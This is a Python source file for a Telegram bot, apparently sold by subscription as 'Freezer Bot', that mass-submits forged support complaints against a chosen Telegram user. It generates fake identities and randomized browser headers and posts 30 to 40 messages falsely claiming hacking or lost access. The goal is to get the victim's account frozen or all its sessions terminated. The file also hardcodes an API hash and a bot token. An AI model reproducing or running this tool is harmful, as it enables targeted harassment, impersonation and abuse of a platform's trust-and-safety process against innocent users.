import asyncio
import aiohttp
import random
import json
import os
import logging
import re
from datetime import datetime, timedelta
from telethon import TelegramClient, events, Button
from telethon.tl.types import MessageEntityPre

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('freezer')

# ==================== КОНФИГ ====================
API_ID = int(os.environ.get('API_ID', 39875871))
API_HASH = os.environ.get('API_HASH', '194a27a63519b6f5e12551fad0038e95')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8698922231:AAFnAa4L4cAMutQBSelPv1pDLXTQvqic670')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 5134284689))

bot = TelegramClient('bot', API_ID, API_HASH)

# ==================== ДАННЫЕ ====================
UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/135.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Version/18.0 Mobile/15E148 Safari/604.1",
]

PHONE_CODES = ['7916','7926','7903','7910','7920','7905','7909','7985','7915','7925',
               '7937','7958','7960','7963','7965','7967','7968','7977','7980','7982']

EMAIL_DOMAINS = ['gmail.com','yahoo.com','outlook.com','proton.me','mail.ru','yandex.ru',
                 'rambler.ru','bk.ru','inbox.ru','icloud.com','hotmail.com']

NAMES = [
    "James Wilson","Michael Brown","David Johnson","Robert Martinez",
    "Thomas Anderson","William Taylor","Daniel Harris","Christopher White",
    "Алексей Иванов","Дмитрий Петров","Сергей Смирнов","Андрей Кузнецов",
    "Максим Васильев","Иван Попов","Егор Соколов","Никита Морозов",
    "Артём Волков","Владимир Новиков","Павел Фёдоров","Антон Михайлов"
]

FREEZE_COMPLAINTS = [
    "URGENT: My account @{u} (ID: {id}) has been hacked. The attacker is currently active and sending messages to my contacts. Please FREEZE my account immediately to prevent further damage. I am the real owner. My phone: +{p}. I can verify my identity. Please freeze until I recover access.",
    "Hello Telegram support, I am the owner of @{u} (ID: {id}). My account was compromised. Someone else is using it right now. Please temporarily freeze my account so the hacker cannot use it. I will verify my identity with my phone number +{p}. This is urgent.",
    "Dear support, I need my account @{u} (ID: {id}) to be frozen immediately. I clicked a phishing link and now a stranger has access. They are messaging my friends and colleagues. My phone: +{p}. Please freeze the account and I will provide any verification needed.",
    "ACCOUNT COMPROMISED: @{u} (ID: {id}). I am the legitimate owner. Someone gained unauthorized access. Please freeze this account now. Phone for verification: +{p}. I can prove ownership through SMS or email.",
    "Dear Telegram team, my account @{u} (ID: {id}) is currently under control of a hacker. I lost access after clicking a malicious link. Please freeze the account temporarily. My number: +{p}. I am ready to verify. Thank you.",
    "Suspicious activity report: Account @{u} (ID: {id}) is sending phishing links to multiple users. This account appears to be compromised or is a scam account. Please investigate and freeze if necessary. Reported by phone: +{p}.",
    "I want to report account @{u} (ID: {id}) for unusual behavior. It is mass-messaging users with suspicious links. This account seems hacked. Please freeze it to protect other users. My phone: +{p}.",
    "Hello, I received strange messages from @{u} (ID: {id}). The account is sending links and asking for money. It looks like a hacked account or a scammer. Please freeze this account. Reporter phone: +{p}.",
    "Report: @{u} (ID: {id}) is behaving like a compromised account. Sending spam and phishing links. Multiple people received these messages. Please freeze for investigation. Phone: +{p}.",
    "Account @{u} (ID: {id}) is sending unsolicited and suspicious messages. Appears to be stolen. Please freeze the account to prevent harm. My contact: +{p}. Thank you.",
    "СРОЧНО: Мой аккаунт @{u} (ID: {id}) взломали. Злоумышленник сейчас активен и пишет моим контактам. Пожалуйста, ЗАМОРОЗЬТЕ аккаунт немедленно. Я настоящий владелец. Телефон: +{p}. Готов подтвердить личность.",
    "Здравствуйте, я владелец @{u} (ID: {id}). Мой аккаунт скомпрометирован. Кто-то другой использует его прямо сейчас. Прошу временно заморозить аккаунт. Мой номер: +{p}. Могу верифицироваться.",
    "Поддержка Telegram, прошу заморозить аккаунт @{u} (ID: {id}). Я перешёл по фишинговой ссылке и теперь посторонний имеет доступ. Пишет моим друзьям. Телефон: +{p}. Заморозьте и я подтвержу личность.",
    "АККАУНТ ВЗЛОМАН: @{u} (ID: {id}). Я законный владелец. Кто-то получил несанкционированный доступ. Заморозьте аккаунт сейчас. Телефон для верификации: +{p}.",
    "Команда Telegram, мой аккаунт @{u} (ID: {id}) под контролем хакера. Потерял доступ после перехода по ссылке. Заморозьте временно. Номер: +{p}. Готов верифицироваться.",
    "Жалоба на подозрительную активность: @{u} (ID: {id}) рассылает фишинговые ссылки. Аккаунт похоже взломан. Заморозьте для проверки. Телефон: +{p}.",
    "Сообщаю о странном поведении @{u} (ID: {id}). Массовая рассылка подозрительных ссылок. Аккаунт взломан. Заморозьте для защиты пользователей. Мой телефон: +{p}.",
    "Здравствуйте, получил странные сообщения от @{u} (ID: {id}). Аккаунт присылает ссылки и просит деньги. Похоже на взлом. Заморозьте. Номер: +{p}.",
    "Репорт: @{u} (ID: {id}) ведёт себя как скомпрометированный аккаунт. Спам и фишинг. Прошу заморозить. Телефон: +{p}.",
    "Аккаунт @{u} (ID: {id}) рассылает нежелательные сообщения. Похоже украден. Заморозьте для предотвращения вреда. Контакт: +{p}.",
]

NUKE_ENDPOINTS = [
    "https://telegram.org/support",
    "https://telegram.org/support?setln=en",
]

# ==================== БАЗА ====================
DB_FILE = 'users.json'
STATE_FILE = 'states.json'

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_db(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=2, default=str)

def get_user(user_id):
    db = load_db()
    uid = str(user_id)
    if uid not in db:
        db[uid] = {'sub_end': None, 'attacks_today': 0, 'banned': False, 'balance_stars': 0}
        save_db(db)
    return db[uid]

def update_user(user_id, data):
    db = load_db()
    db[str(user_id)] = data
    save_db(db)

def has_sub(user_id):
    if user_id == ADMIN_ID:
        return True
    user = get_user(user_id)
    if user['sub_end'] == 'forever':
        return True
    if user['sub_end']:
        end = datetime.fromisoformat(user['sub_end'])
        if end > datetime.now():
            return True
    return False

def add_sub(user_id, days):
    user = get_user(user_id)
    if days == 'forever':
        user['sub_end'] = 'forever'
    else:
        if user['sub_end'] and user['sub_end'] != 'forever' and datetime.fromisoformat(user['sub_end']) > datetime.now():
            start = datetime.fromisoformat(user['sub_end'])
        else:
            start = datetime.now()
        user['sub_end'] = (start + timedelta(days=days)).isoformat()
    update_user(user_id, user)

# ==================== СОСТОЯНИЯ ====================
def load_states():
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_states(data):
    with open(STATE_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def set_state(user_id, state):
    states = load_states()
    states[str(user_id)] = state
    save_states(states)

def get_state(user_id):
    states = load_states()
    return states.get(str(user_id))

def clear_state(user_id):
    states = load_states()
    states.pop(str(user_id), None)
    save_states(states)

# ==================== ОТПРАВКА ЖАЛОБ ====================
async def send_freeze_form(target, tid):
    phone = f"+7{random.choice(PHONE_CODES)}{random.randint(1000000, 9999999)}"
    name = random.choice(NAMES)
    email = f"{name.lower().replace(' ', '.')}{random.randint(10, 9999)}@{random.choice(EMAIL_DOMAINS)}"
    body = random.choice(FREEZE_COMPLAINTS).format(u=target, id=tid, p=phone)
    
    headers = {
        "User-Agent": random.choice(UA),
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://telegram.org",
        "Referer": "https://telegram.org/support"
    }
    
    data = {
        "problem": body,
        "email": email,
        "phone": phone,
        "username": f"@{target}",
        "type": "hacked_account"
    }
    
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post("https://telegram.org/support", headers=headers, data=data,
                              timeout=aiohttp.ClientTimeout(total=15)) as r:
                return r.status == 200
    except:
        return False

async def send_nuke_request(target, tid):
    phone = f"+7{random.choice(PHONE_CODES)}{random.randint(1000000, 9999999)}"
    name = random.choice(NAMES)
    email = f"{name.lower().replace(' ', '.')}{random.randint(10, 9999)}@{random.choice(EMAIL_DOMAINS)}"
    
    bodies = [
        f"I lost access to my account @{target} (ID: {tid}). My phone died and I can't get SMS codes. Please terminate all active sessions immediately. I can verify with my phone: +{phone}. Email: {email}",
        f"URGENT: @{target} ID:{tid} — I am the owner. Someone logged into my account from another country. Terminate all other sessions now. My phone: +{phone}. I am the real owner.",
        f"Security breach: @{target} (ID:{tid}). Unauthorized login detected. I need all sessions terminated except this request. Phone: +{phone}. Verification ready.",
        f"Lost phone with active Telegram session @{target} ID:{tid}. Please kill all sessions. I can prove identity with phone +{phone} and email {email}.",
        f"Account @{target} ID:{tid} hacked. Terminate all sessions immediately. Owner phone: +{phone}. Please act fast.",
        f"Срочно: потерял доступ к @{target} ID:{tid}. Телефон сдох. Убейте все активные сессии. Мой номер: +{phone}. Почта: {email}",
        f"Взлом @{target} ID:{tid}. Прошу принудительно завершить все сессии кроме этого запроса. Владелец: +{phone}.",
        f"Потерян телефон с сессией @{target} ID:{tid}. Сбросьте все сессии. Подтверждение через +{phone}.",
    ]
    body = random.choice(bodies)
    
    headers = {
        "User-Agent": random.choice(UA),
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://telegram.org",
        "Referer": "https://telegram.org/support"
    }
    
    data = {
        "problem": body,
        "email": email,
        "phone": phone,
        "username": f"@{target}",
        "type": "lost_access"
    }
    
    try:
        async with aiohttp.ClientSession() as s:
            endpoint = random.choice(NUKE_ENDPOINTS)
            async with s.post(endpoint, headers=headers, data=data,
                              timeout=aiohttp.ClientTimeout(total=15)) as r:
                return r.status == 200
    except:
        return False

# ==================== КЛАВИАТУРЫ ====================
def main_menu(user_id):
    sub_text = "✅" if has_sub(user_id) else "❌"
    return [
        [Button.inline("❄️ Заморозка", b"attack_freeze")],
        [Button.inline("💣 Сброс сессий", b"attack_nuke")],
        [Button.inline(f"⭐ Подписка [{sub_text}]", b"sub_menu")],
        [Button.inline("👤 Профиль", b"profile")],
    ]

def admin_menu():
    return [
        [Button.inline("📊 Статистика", b"admin_stats")],
        [Button.inline("👥 Пользователи", b"admin_users")],
        [Button.inline("⭐ Выдать подписку", b"admin_give_sub")],
        [Button.inline("🚫 Бан", b"admin_ban")],
        [Button.inline("🔙 Назад", b"back_main")],
    ]

def sub_menu():
    return [
        [Button.inline("⭐ 1 день — 50 ⭐", b"sub_1d")],
        [Button.inline("⭐ 7 дней — 150 ⭐", b"sub_7d")],
        [Button.inline("⭐ Навсегда — 250 ⭐", b"sub_forever")],
        [Button.inline("🔙 Назад", b"back_main")],
    ]

def back_button():
    return [[Button.inline("🔙 Назад", b"back_main")]]

# ==================== КОМАНДЫ ====================
@bot.on(events.NewMessage(pattern='/start'))
async def cmd_start(event):
    user = get_user(event.sender_id)
    if user.get('banned'):
        await event.reply("⛔ Вы забанены.")
        return
    clear_state(event.sender_id)
    await event.reply(
        "❄️ **FREEZER BOT**\n"
        "Заморозка и сброс сессий Telegram.\n\n"
        "Выберите действие:",
        buttons=main_menu(event.sender_id)
    )

@bot.on(events.NewMessage(pattern='/admin'))
async def cmd_admin(event):
    if event.sender_id != ADMIN_ID:
        return
    await event.reply("🔐 **Админ-панель**", buttons=admin_menu())

# ==================== ОБРАБОТЧИК СООБЩЕНИЙ ДЛЯ АТАК ====================
@bot.on(events.NewMessage(func=lambda e: get_state(e.sender_id) is not None))
async def handle_attack_input(event):
    state = get_state(event.sender_id)
    if not state:
        return
    
    text = event.message.text.strip()
    match = re.match(r'@?(\S+)\s+(\d+)', text)
    
    if not match:
        await event.reply("❌ Неверный формат. Отправьте: `@username ID`\nПример: `@targetuser 123456789`")
        return
    
    target = match.group(1)
    tid = match.group(2)
    attack_type = state
    
    clear_state(event.sender_id)
    
    count = 30 if attack_type == 'freeze' else 40
    emoji = "❄️" if attack_type == 'freeze' else "💣"
    name = "ЗАМОРОЗКА" if attack_type == 'freeze' else "СБРОС СЕССИЙ"
    
    msg = await event.reply(f"{emoji} {name} @{target}\n🆔 ID: {tid}\n⚡ Отправка {count} запросов...")
    
    ok = 0
    for i in range(count):
        if attack_type == 'freeze':
            success = await send_freeze_form(target, tid)
        else:
            success = await send_nuke_request(target, tid)
        
        if success:
            ok += 1
        
        delay = random.uniform(1.5, 4.0)
        await asyncio.sleep(delay)
        
        if (i + 1) % 5 == 0 or i == count - 1:
            try:
                await msg.edit(f"{emoji} {name} @{target}\n🆔 ID: {tid}\n📊 Прогресс: [{i+1}/{count}]\n✅ Успешно: {ok}")
            except:
                pass
    
    user = get_user(event.sender_id)
    user['attacks_today'] += 1
    update_user(event.sender_id, user)
    
    await msg.edit(
        f"{emoji} **АТАКА ЗАВЕРШЕНА**\n\n"
        f"👤 Цель: @{target}\n"
        f"🆔 ID: `{tid}`\n"
        f"📊 Результат: {ok}/{count} запросов отправлено\n"
        f"⏱ Эффект в течение 1-24 часов",
        buttons=back_button()
    )

# ==================== ОБРАБОТЧИКИ КНОПОК ====================
@bot.on(events.CallbackQuery)
async def callback_handler(event):
    data = event.data.decode()
    uid = event.sender_id
    user = get_user(uid)
    
    if user.get('banned') and data not in ("sub_menu", "back_main"):
        await event.answer("⛔ Вы забанены.", alert=True)
        return
    
    # Главное меню
    if data == "back_main":
        clear_state(uid)
        await event.edit("❄️ **FREEZER BOT**\nВыберите действие:", buttons=main_menu(uid))
    
    # Профиль
    elif data == "profile":
        u = get_user(uid)
        if u['sub_end'] == 'forever':
            sub = "✅ Навсегда"
        elif u['sub_end'] and datetime.fromisoformat(u['sub_end']) > datetime.now():
            sub = f"✅ До {datetime.fromisoformat(u['sub_end']).strftime('%d.%m.%Y')}"
        else:
            sub = "❌ Нет"
        stars = u.get('balance_stars', 0)
        txt = f"👤 **Профиль**\n\n🆔 `{uid}`\n⭐ Подписка: {sub}\n💎 Звёзды: {stars}\n🔥 Атак сегодня: {u['attacks_today']}"
        await event.edit(txt, buttons=back_button())
    
    # Меню подписки
    elif data == "sub_menu":
        await event.edit(
            "⭐ **Подписка**\n\n"
            "• 1 день — 50 ⭐\n"
            "• 7 дней — 150 ⭐\n"
            "• Навсегда — 250 ⭐\n\n"
            "Оплата через Telegram Stars.\n"
            "Нажмите на нужный тариф для оплаты.",
            buttons=sub_menu()
        )
    
    # Выбор подписки — отправка инвойса
    elif data in ("sub_1d", "sub_7d", "sub_forever"):
        if data == "sub_1d":
            days, price, title = 1, 50, "Подписка на 1 день"
            payload = "sub_1d"
        elif data == "sub_7d":
            days, price, title = 7, 150, "Подписка на 7 дней"
            payload = "sub_7d"
        else:
            days, price, title = 'forever', 250, "Подписка навсегда"
            payload = "sub_forever"
        
        await event.answer("Формирую счёт...")
        
        try:
            await bot.send_invoice(
                entity=uid,
                title=title,
                description=f"Доступ к Freezer Bot на {'навсегда' if days == 'forever' else f'{days} дн.'}",
                payload=payload.encode(),
                provider_token="",
                currency="XTR",
                prices=[{
                    "label": title,
                    "amount": price
                }],
                start_parameter=f"sub_{days}",
                photo_url="https://i.imgur.com/4AIeQxA.png",
                photo_width=512,
                photo_height=512,
                need_name=False,
                need_phone_number=False,
                need_email=False,
                need_shipping_address=False,
                send_phone_number_to_provider=False,
                send_email_to_provider=False,
                is_flexible=False
            )
            await event.edit(
                f"💳 **Счёт на {price} ⭐ отправлен!**\n\n"
                f"Проверьте личные сообщения с ботом и оплатите счёт.\n"
                f"После оплаты подписка активируется автоматически.",
                buttons=back_button()
            )
        except Exception as e:
            await event.edit(
                f"❌ Ошибка при создании счёта: {str(e)}\n\nПопробуйте позже.",
                buttons=back_button()
            )
    
    # Заморозка
    elif data == "attack_freeze":
        if not has_sub(uid):
            await event.answer("❌ Нужна подписка!", alert=True)
            return
        set_state(uid, 'freeze')
        await event.edit(
            "❄️ **ЗАМОРОЗКА**\n\n"
            "Отправьте цель в формате:\n"
            "`@username ID`\n\n"
            "Пример: `@targetuser 123456789`\n\n"
            "Будет отправлено 30 жалоб на взлом.\n"
            "Аккаунт замёрзнет в течение 1-24 часов.",
            buttons=back_button()
        )
    
    # Сброс сессий
    elif data == "attack_nuke":
        if not has_sub(uid):
            await event.answer("❌ Нужна подписка!", alert=True)
            return
        set_state(uid, 'nuke')
        await event.edit(
            "💣 **СБРОС СЕССИЙ**\n\n"
            "Отправьте цель в формате:\n"
            "`@username ID`\n\n"
            "Пример: `@targetuser 123456789`\n\n"
            "Будет отправлено 40 запросов на сброс.\n"
            "Все сессии отвалятся в течение 1-24 часов.",
            buttons=back_button()
        )
    
    # Админка
    elif data == "admin_stats" and uid == ADMIN_ID:
        db = load_db()
        total = len(db)
        active = sum(1 for u in db.values() if u.get('sub_end') and (u['sub_end'] == 'forever' or datetime.fromisoformat(u['sub_end']) > datetime.now()))
        await event.edit(f"📊 **Статистика**\n\n👥 Пользователей: {total}\n⭐ Подписок: {active}", buttons=admin_menu())
    
    elif data == "admin_users" and uid == ADMIN_ID:
        db = load_db()
        txt = "👥 **Пользователи:**\n\n"
        for uid_str, u in list(db.items())[-15:]:
            if u.get('sub_end') == 'forever':
                sub = "✅ Навсегда"
            elif u.get('sub_end') and datetime.fromisoformat(u['sub_end']) > datetime.now():
                sub = f"✅ До {datetime.fromisoformat(u['sub_end']).strftime('%d.%m.%y')}"
            else:
                sub = "❌"
            ban = "🚫" if u.get('banned') else ""
            txt += f"`{uid_str}` — {sub} {ban}\n"
        await event.edit(txt, buttons=admin_menu())
    
    elif data == "admin_give_sub" and uid == ADMIN_ID:
        set_state(uid, 'admin_sub')
        await event.edit("⭐ **Выдать подписку**\n\nФормат: `ID дни` или `ID forever`\nПример: `123456 30`", buttons=back_button())
    
    elif data == "admin_ban" and uid == ADMIN_ID:
        set_state(uid, 'admin_ban')
        await event.edit("🚫 **Бан**\n\nОтправьте ID пользователя:", buttons=back_button())

# ==================== ОБРАБОТКА ПЛАТЕЖЕЙ ====================
@bot.on(events.Raw(types=events.raw.types.UpdateBotPrecheckoutQuery))
async def pre_checkout(event):
    query = event.query
    try:
        await bot(
            functions.messages.SetBotPrecheckoutResultsRequest(
                query_id=query.query_id,
                success=True,
                error=None
            )
        )
    except:
        pass

@bot.on(events.Raw(types=events.raw.types.UpdateBotMessageReaction))
async def handle_reaction(event):
    pass

@bot.on(events.Raw(types=events.raw.types.UpdateBotNewBusinessMessage))
async def handle_business(event):
    pass

@bot.on(events.Raw())
async def raw_handler(event):
    update = event.update
    
    # Обработка успешного платежа
    if hasattr(update, 'msg_id') and hasattr(update, 'peer'):
        if hasattr(update, 'message') and hasattr(update.message, 'action'):
            action = update.message.action
            if hasattr(action, 'currency') and hasattr(action, 'total_amount'):
                uid = update.peer.user_id
                payload = action.payload.decode() if hasattr(action, 'payload') and action.payload else ""
                amount = action.total_amount
                
                if payload in ("sub_1d", "sub_7d", "sub_forever"):
                    if payload == "sub_1d":
                        days, ttl = 1, "1 день"
                    elif payload == "sub_7d":
                        days, ttl = 7, "7 дней"
                    else:
                        days, ttl = 'forever', "Навсегда"
                    
                    add_sub(uid, days)
                    
                    try:
                        await bot.send_message(
                            uid,
                            f"✅ **Оплата прошла!**\n\n"
                            f"💎 Списано: {amount} ⭐\n"
                            f"📅 Подписка: {ttl}\n\n"
                            f"Используйте /start для атак.",
                            buttons=back_button()
                        )
                    except:
                        pass

# ==================== АДМИН ВВОД ====================
@bot.on(events.NewMessage(func=lambda e: get_state(e.sender_id) in ('admin_sub', 'admin_ban')))
async def handle_admin_input(event):
    state = get_state(event.sender_id)
    if state == 'admin_sub':
        parts = event.message.text.split()
        if len(parts) >= 2:
            uid = int(parts[0])
            days = int(parts[1]) if parts[1] != 'forever' else 'forever'
            add_sub(uid, days)
            clear_state(event.sender_id)
            await event.reply(f"✅ Подписка `{parts[1]}` выдана `{uid}`", buttons=back_button())
    elif state == 'admin_ban':
        try:
            uid = int(event.message.text.strip())
            u = get_user(uid)
            u['banned'] = True
            update_user(uid, u)
            clear_state(event.sender_id)
            await event.reply(f"🚫 `{uid}` забанен", buttons=back_button())
        except:
            await event.reply("❌ Неверный ID")

# ==================== ОТЛОВ ВСЕХ ОБНОВЛЕНИЙ ПЛАТЕЖЕЙ ====================
from telethon import functions
from telethon.tl.types import UpdateBotPrecheckoutQuery, UpdateBotMessageReaction

@bot.on(events.Raw(types=UpdateBotPrecheckoutQuery))
async def pre_checkout_handler(event):
    query = event.query
    try:
        await bot(functions.messages.SetBotPrecheckoutResultsRequest(
            query_id=query.query_id,
            success=True,
            error=None
        ))
    except Exception as e:
        logger.error(f"Precheckout error: {e}")

# ==================== ЗАПУСК ====================
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"❄️ @{me.username} запущен")
    logger.info("❄️ Freezer Bot активен")
    logger.info("⭐ Приём платежей через Telegram Stars настроен")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
